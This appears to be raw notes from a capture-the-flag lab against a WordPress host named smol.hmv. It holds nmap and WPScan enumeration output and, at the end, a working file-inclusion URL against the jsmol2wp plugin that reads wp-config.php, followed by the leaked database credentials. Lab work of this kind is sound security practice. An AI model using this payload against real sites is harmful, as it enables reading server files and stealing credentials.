


WordPress/6.7 

22/tcp open   ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 44:5f:26:67:4b:4a:91:9b:59:7a:95:59:c8:4c:2e:04 (RSA)
|   256 0a:4b:b9:b1:77:d2:48:79:fc:2f:8a:3d:64:3a:ad:94 (ECDSA)
|_  256 d3:3b:97:ea:54:bc:41:4d:03:39:f6:8f:ad:b6:a0:fb (ED25519)
80/tcp open   http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://www.smol.hmv
MAC Address: 08:00:27:7C:33:5C (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


/wp-content/plugins/akismet/readme.txt 



JoseMarioLladoMarti
 
 wordpress user

[+] URL: http://www.smol.hmv/ [192.168.0.108]
[+] Started: Tue Nov 19 23:01:32 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://www.smol.hmv/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://www.smol.hmv/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://www.smol.hmv/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://www.smol.hmv/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 6.7 identified (Latest, released on 2024-11-12).
 | Found By: Rss Generator (Passive Detection)
 |  - http://www.smol.hmv/index.php/feed/, <generator>https://wordpress.org/?v=6.7</generator>
 |  - http://www.smol.hmv/index.php/comments/feed/, <generator>https://wordpress.org/?v=6.7</generator>

[+] WordPress theme in use: popularfx
 | Location: http://www.smol.hmv/wp-content/themes/popularfx/
 | Latest Version: 1.2.5 (up to date)
 | Last Updated: 2024-02-02T00:00:00.000Z
 | Readme: http://www.smol.hmv/wp-content/themes/popularfx/readme.txt
 | Style URL: http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5
 | Style Name: PopularFX
 | Style URI: https://popularfx.com
 | Description: Lightweight theme to make beautiful websites with Pagelayer. Includes 100s of pre-made templates to ...
 | Author: Pagelayer
 | Author URI: https://pagelayer.com
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2.5 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://www.smol.hmv/wp-content/themes/popularfx/style.css?ver=1.2.5, Match: 'Version: 1.2.5'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] jsmol2wp
 | Location: http://www.smol.hmv/wp-content/plugins/jsmol2wp/
 | Latest Version: 1.07 (up to date)
 | Last Updated: 2018-03-09T10:28:00.000Z
 |
 | Found By: Urls In Homepage (Passive Detection)
 |
 | Version: 1.07 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://www.smol.hmv/wp-content/plugins/jsmol2wp/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:01 <=========================================================================================> (137 / 137) 100.00% Time: 00:00:01

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Tue Nov 19 23:02:03 2024
[+] Requests Done: 188
[+] Cached Requests: 5
[+] Data Sent: 45.898 KB
[+] Data Received: 21.869 MB
[+] Memory used: 278.898 MB
[+] Elapsed time: 00:00:31
┌─[r1ck@parrot]─[/etc/apt/


http://www.smol.hmv/wp-content/plugins/jsmol2wp/php/jsmol.php?isform=true&call=getRawDataFromDatabase&query=php://filter/resource=../../../../wp-config.php

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define( 'DB_NAME', 'wordpress' );

/** Database username */
define( 'DB_USER', 'wpuser' );

/** Database password */
define( 'DB_PASSWORD', 'kbLSF2Vop#lw3rjDZ629*Z%G' );

/** Database hostname */
define( 'DB_HOST', 'localhost' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );


